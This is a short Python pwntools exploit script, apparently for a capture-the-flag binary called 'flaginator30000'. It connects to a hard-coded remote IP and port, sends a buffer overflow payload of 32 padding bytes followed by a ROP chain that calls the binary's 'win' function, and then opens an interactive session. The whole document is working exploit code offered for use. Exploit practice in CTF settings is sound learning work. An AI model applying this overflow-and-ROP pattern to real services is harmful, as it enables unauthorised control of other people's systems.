from pwn import *

# p = process("./flaginator30000")
p = remote("34.248.117.23", 5000)
elf = ELF("./flaginator30000")
rop = ROP(elf)

p.recvuntil(b">> ")

# ROP chain
rop.call(elf.symbols["win"])

print(rop.chain())
payload = [
    b"A" * 32,
    rop.chain(),
]
payload = b"".join(payload)

p.sendline(payload)
p.interactive()
